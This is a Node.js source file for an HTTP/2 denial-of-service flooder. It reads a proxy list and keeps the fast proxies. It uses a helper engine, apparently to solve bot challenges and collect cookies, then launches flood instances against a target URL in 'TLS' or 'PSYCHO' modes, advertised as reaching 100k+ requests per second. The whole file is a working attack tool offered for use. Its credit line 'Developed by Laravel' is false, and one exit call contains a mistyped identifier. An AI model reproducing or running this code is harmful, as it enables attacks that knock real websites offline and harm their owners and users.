/**
 *
 * Developed by Laravel
 *
 */

process.on('uncaughtException', function (er) {
  console.log(er);
});
process.on('unhandledRejection', function (er) {
  console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const {
  solverInstance
} = require('./engine');
const {
  spawn
} = require('child_process');

const fs = require('fs');
const colors = require('colors');

const randstr = require("randomstring")

const request = require("request");
const url = require('url'),
  http = require('http'),

  tls = require('tls'),
  http2 = require('http2');

const argv = require('minimist')(process.argv.slice(2))

  require('log-timestamp')( () => {
    let d = new Date();

    let hours = (d.getHours()<10?'0':'') + d.getHours();
    let minutes = (d.getMinutes()<10?'0':'') + d.getMinutes();
    let seconds = (d.getSeconds()<10?'0':'') + d.getSeconds();

    return "\033[38;5;199m" + `(${hours}-${minutes}-${seconds})`
  }); // for better logs

const validProxies = [];

const urlT = process.argv[2];
const timeT = process.argv[3];
const sessT = process.argv[4];

/** <><> Custom ARGS (such as Method postdata and etc..) */
const method = argv["method"] || "GET";
const postdata = argv["postdata"] || false;
const uptime = argv["uptime"] || 10000;
const attackmode = argv["mode"] || 'TLS';
const rate = argv["rate"] || 64;

if (process.argv.length < 5) {
  console.log('[Main] '.magenta + `Wrong Usage.`.red)
  console.log('[Main] '.magenta + `Usage: `.red + `node index2.js [Target] [Time] [Sessions] --method=[Method] --postdata=[Post Data <POST Method required] --uptime=[Time which given to get response of proxy.. <MilliSeconds>] --mode=[AttackMode]`.yellow)
  console.log('[Main] '.magenta + `Info: `.red + `Attack mode\s: TLS (HTTP/2 Flooder with real headers, for high load, not much r/s) | PSYCHO (HTTP/2 Flooder without real headers, not for high load, much r/s (100k+).\n\n`.yellow)
  process.exit(0);
}

const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');

if ((attackmode != 'TLS' && attackmode != 'PSYCHO' && attackmode != 'SOCKET')) {
  console.log('[Main] '.magenta + `Wrong Attack Mode..`.red)
  process.exit(0);
}

const useragents = [
  "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/104.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/105.0"
]

function randPrx() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

function randUa() {
  return useragents[Math.floor(Math.random() * useragents.length)];
}

function ra() {
  const rsdat = randstr.generate({
    "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
    "length": 4
  });
  return rsdat;
}


if (postdata && method != "POST") {
  // log('Error'.yellow + ': Method invalid. We get Post-Data and method != POST.');
  console.log('[Main] '.magenta + `Method invalid. We get Post-Data and method != POST`.red)
  procсes.exit();
}

var checking = true;

function
  shuffle(array) {
  let currentIndex = array.length,
    randomIndex;
  // While there remain elements to shuffle.
  while (currentIndex != 0) {
    // Pick a remaining element.
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex--;
    // And swap it with the current element.
    [array[currentIndex], array[randomIndex]] = [
      array[randomIndex], array[currentIndex]
    ];
  }
  return array;
};

function check_proxy(proxy) {
  if (checking === false || validProxies.length > 300) return;

  request({
    url: urlT,
    proxy: "http://" + proxy,
    headers: {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    },
    time: true
  }, (err, res, body) => {
    if (!err) {
      if (checking === false || validProxies.length > 300 || res.elapsedTime > uptime) return;

      if (res.elapsedTime > uptime) {
        return
      } else {
        // log('[Wired]'.yellow + ` Proxy: ${proxy} | Response time: ${res.elapsedTime} ms.`);
        console.log('[Main] '.magenta + `New proxy `.red + `${proxy}`.yellow + ` | Elapsed time: `.red + `${res.elapsedTime} ms.`.yellow)
        validProxies.push(proxy);
      }
    }
  });
}

let domain = url.parse(urlT).hostname;

async function sessionIn() {
  for (var i = 0; i < sessT; i++) {
    solverInstance({
      "Target": urlT,
      "Proxy": validProxies[i],
      "ua": randUa()
    }).then(async (data, _) => {
      await console.log('[Flooder] '.magenta + `New flooder instance `.red + `${data.proxy}`.yellow + ` | Cookie: ${data.cookie}`)
      if (attackmode == 'TLS') {
        require('./flooder/tlsv2').flooder(
          data.cookie,
          data.proxy,
          data.ua,
          data.headers,
          postdata,
          method,
          urlT,
          rate
        )
      } else if (attackmode == 'PSYCHO') {
        for (let i = 0; i < 4; i++) {
          const sus = spawn('./psycho', [urlT, data.ua, timeT, data.cookie, "GET", rate, data.proxy])
        }
      }
    }).catch((ee) => {
      console.log(ee)
    })
  }
}

function main() {
  shuffle(proxies).forEach((e) => {
    check_proxy(e);
  })

  var sec = 10;
  console.log('[Main] '.magenta + `Starting Checker.. `.red)

  var checkingProxies = setInterval(() => {
    sec -= 1;
    if (sec == 0) {
      // log('[Wired]'.yellow + ` Proxy checking end. ${validProxies.length} valid proxies`);
      console.log('[Main] '.magenta + `Checker end checking. `.red + `| ${validProxies.length} valid proxies`.yellow)
      console.log('[Main] '.magenta + `Starting instances. `.red)
      checking = false;
      clearInterval(checkingProxies);
      return sessionIn();
    }
  }, 1000);


}

main();

setTimeout(() => {
  process.exit(0);
  process.exit(0);
  process.exit(0);
}, timeT * 1000)

// sessionIn();
